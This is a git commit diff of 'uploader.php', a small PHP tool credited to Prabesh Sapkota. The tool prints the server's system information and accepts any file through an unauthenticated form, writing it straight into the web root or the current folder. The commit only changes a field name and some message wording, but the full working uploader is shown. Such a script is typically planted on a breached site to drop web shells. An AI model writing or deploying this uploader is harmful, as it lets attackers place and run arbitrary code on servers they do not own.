85244235501a2e332fe8c42ade95594df719e4b2
Prabesh01 <51240439+Prabesh01@users.noreply.github.com>
2020-04-05 04:49:20 +0000

    Update uploader.php

--- uploader.php
+++ uploader.php
@@ -1,28 +1,30 @@
 <?php
-echo "Uploader by Prabesh Sapkota<br>";
+echo "Uploader By Prabesh Sapkota<br>";
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
-	  <input type='file' name='lmao'>
+	  <input type='file' name='updlf'>
 	  <input type='submit' name='upload' value='upload'>
 	  </form>";
 $root = $_SERVER['DOCUMENT_ROOT'];
-$files = $_FILES['lmao']['name'];
+$files = $_FILES['updlf']['name'];
 $dest = $root.'/'.$files;
 if(isset($_POST['upload'])) {
 	if(is_writable($root)) {
-		if(@copy($_FILES['lmao']['tmp_name'], $dest)) {
+		if(@copy($_FILES['updlf']['tmp_name'], $dest)) {
 			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "Uploaded Sucessfully! Go to this link -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+			echo "Upload Sucessfull :) -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
 		} else {
-			echo "Can't Upload the file !";
+			echo "Could not upload the file :(";
 		}
 	} else {
-		if(@copy($_FILES['lmao']['tmp_name'], $files)) {
-			echo "You file : <b>$files</b> was uploaded to the same folder";
+		if(@copy($_FILES['updlf']['tmp_name'], $files)) {
+			echo "Your file : <b>$files</b> have been uploaded in the same folder";
 		} else {
-			echo "Its Dead !";
+			echo "Dead -_-";
 		}
 	}
 }
 ?>
+
+
 
